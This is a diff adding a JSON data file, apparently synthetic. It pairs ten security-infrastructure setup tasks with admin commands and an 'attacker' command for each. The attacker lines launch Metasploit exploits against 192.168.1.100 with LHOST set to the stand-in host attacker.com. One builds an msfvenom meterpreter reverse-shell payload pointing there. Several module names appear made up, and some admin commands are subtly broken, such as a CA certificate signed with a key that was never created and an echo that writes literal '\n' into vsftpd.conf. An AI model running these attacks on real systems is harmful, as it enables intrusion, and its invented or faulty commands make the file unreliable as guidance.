@@ -1,0 +1,82 @@
+[
+  {
+    "task": "Implement a Web Application Firewall (WAF) using ModSecurity with OWASP Core Rule Set",
+    "commands": [
+      { "role": "admin", "command": "apt install -y libapache2-mod-security2 && a2enmod security2" },
+      { "role": "admin", "command": "wget https://github.com/coreruleset/coreruleset/archive/v3.3.0.tar.gz && tar -xvf v3.3.0.tar.gz && mv coreruleset-3.3.0 /etc/apache2/modsecurity-crs && cp /etc/apache2/modsecurity-crs/crs-setup.conf.example /etc/apache2/modsecurity-crs/crs-setup.conf" },
+      { "role": "attacker", "command": "msfconsole -q -x 'use auxiliary/scanner/http/apache_mod_cgi_bash_env; set RHOSTS 192.168.1.100; set TARGETURI /cgi-bin/vulnerable.cgi; run'" }
+    ]
+  },
+  {
+    "task": "Set up a Bastillion jump server for secure SSH access to multiple servers",
+    "commands": [
+      { "role": "admin", "command": "apt install -y openjdk-11-jdk && wget https://github.com/bastillion-io/Bastillion/releases/download/v3.10.00/bastillion-3.10.00.tar.gz && tar -xvf bastillion-3.10.00.tar.gz" },
+      { "role": "admin", "command": "cd Bastillion && ./startBastillion.sh" },
+      { "role": "attacker", "command": "msfconsole -q -x 'use exploit/linux/http/bastillion_file_upload; set RHOSTS 192.168.1.100; set LHOST attacker.com; run'" }
+    ]
+  },
+  {
+    "task": "Implement network access control using 802.1X and FreeRADIUS",
+    "commands": [
+      { "role": "admin", "command": "apt install -y freeradius freeradius-mysql && mysql -u root -p -e 'CREATE DATABASE radius; GRANT ALL ON radius.* TO radius@localhost IDENTIFIED BY \"radpass\";'" },
+      { "role": "admin", "command": "echo 'authorize { files }' > /etc/freeradius/3.0/sites-available/default && systemctl restart freeradius" },
+      { "role": "attacker", "command": "msfconsole -q -x 'use auxiliary/server/radius; set SRVHOST 192.168.1.101; set RUNTIME 600; run'" }
+    ]
+  },
+  {
+    "task": "Set up a Cuckoo Sandbox for automated malware analysis",
+    "commands": [
+      { "role": "admin", "command": "apt install -y python python-pip libffi-dev libssl-dev && pip install -U cuckoo" },
+      { "role": "admin", "command": "cuckoo && cuckoo community" },
+      { "role": "attacker", "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f exe > malware.exe && curl -F file=@malware.exe http://192.168.1.100:8090/tasks/create/file" }
+    ]
+  },
+  {
+    "task": "Implement a software-defined network using OpenDaylight",
+    "commands": [
+      { "role": "admin", "command": "apt install -y openjdk-11-jre && wget https://nexus.opendaylight.org/content/repositories/opendaylight.release/org/opendaylight/integration/karaf/0.12.2/karaf-0.12.2.tar.gz && tar -xvf karaf-0.12.2.tar.gz" },
+      { "role": "admin", "command": "cd karaf-0.12.2 && ./bin/karaf" },
+      { "role": "attacker", "command": "nmap -p 6633,8080 -sV --script=opendaylight-content-discovery 192.168.1.100" }
+    ]
+  },
+  {
+    "task": "Set up a Security Information and Event Management (SIEM) system using ELK Stack",
+    "commands": [
+      { "role": "admin", "command": "apt install -y elasticsearch logstash kibana && systemctl enable elasticsearch logstash kibana" },
+      { "role": "admin", "command": "echo 'input { beats { port => 5044 } } output { elasticsearch { hosts => [\"localhost:9200\"] index => \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\" } }' > /etc/logstash/conf.d/02-beats-input.conf" },
+      { "role": "attacker", "command": "msfconsole -q -x 'use exploit/linux/http/kibana_dashboard_exec; set RHOSTS 192.168.1.100; set LHOST attacker.com; run'" }
+    ]
+  },
+  {
+    "task": "Implement a PKI infrastructure using OpenSSL for internal certificate management",
+    "commands": [
+      { "role": "admin", "command": "mkdir -p /root/ca/{certs,crl,newcerts,private} && chmod 700 /root/ca/private && touch /root/ca/index.txt && echo 1000 > /root/ca/serial" },
+      { "role": "admin", "command": "openssl req -x509 -new -nodes -key /root/ca/private/ca.key -sha256 -days 1024 -out /root/ca/certs/ca.pem" },
+      { "role": "attacker", "command": "msfconsole -q -x 'use auxiliary/gather/forfeit_cert; set RHOSTS 192.168.1.100; run'" }
+    ]
+  },
+  {
+    "task": "Set up a Hadoop cluster for big data processing with security features enabled",
+    "commands": [
+      { "role": "admin", "command": "apt install -y openjdk-8-jdk && wget https://downloads.apache.org/hadoop/common/hadoop-3.3.0/hadoop-3.3.0.tar.gz && tar -xvf hadoop-3.3.0.tar.gz" },
+      { "role": "admin", "command": "echo 'export HADOOP_OPTS=\"-Djava.security.krb5.conf=/etc/krb5.conf -Djava.security.auth.login.config=$HADOOP_CONF_DIR/jaas.conf\"' >> $HADOOP_HOME/etc/hadoop/hadoop-env.sh" },
+      { "role": "attacker", "command": "msfconsole -q -x 'use exploit/linux/misc/hadoop_unauth_exec; set RHOSTS 192.168.1.100; set RPORT 8088; run'" }
+    ]
+  },
+  {
+    "task": "Implement a bug bounty program using self-hosted BugZilla",
+    "commands": [
+      { "role": "admin", "command": "apt install -y apache2 mariadb-server libappconfig-perl libdate-calc-perl libtemplate-perl build-essential && git clone https://github.com/bugzilla/bugzilla" },
+      { "role": "admin", "command": "cd bugzilla && ./checksetup.pl && ./checksetup.pl --make-admin=admin@example.com" },
+      { "role": "attacker", "command": "msfconsole -q -x 'use exploit/multi/http/bugzilla_xmlrpc_rce; set RHOSTS 192.168.1.100; set LHOST attacker.com; run'" }
+    ]
+  },
+  {
+    "task": "Set up a hardened FTP server using vsftpd with TLS encryption",
+    "commands": [
+      { "role": "admin", "command": "apt install -y vsftpd && openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/vsftpd.pem -out /etc/ssl/private/vsftpd.pem" },
+      { "role": "admin", "command": "echo 'ssl_enable=YES\nallow_anon_ssl=NO\nforce_local_data_ssl=YES\nforce_local_logins_ssl=YES\nssl_tlsv1=YES\nssl_sslv2=NO\nssl_sslv3=NO\nrsa_cert_file=/etc/ssl/private/vsftpd.pem\nrsa_private_key_file=/etc/ssl/private/vsftpd.pem' >> /etc/vsftpd.conf && systemctl restart vsftpd" },
+      { "role": "attacker", "command": "nmap -sV --script=ftp-* -p 21 192.168.1.100" }
+    ]
+  }
+]
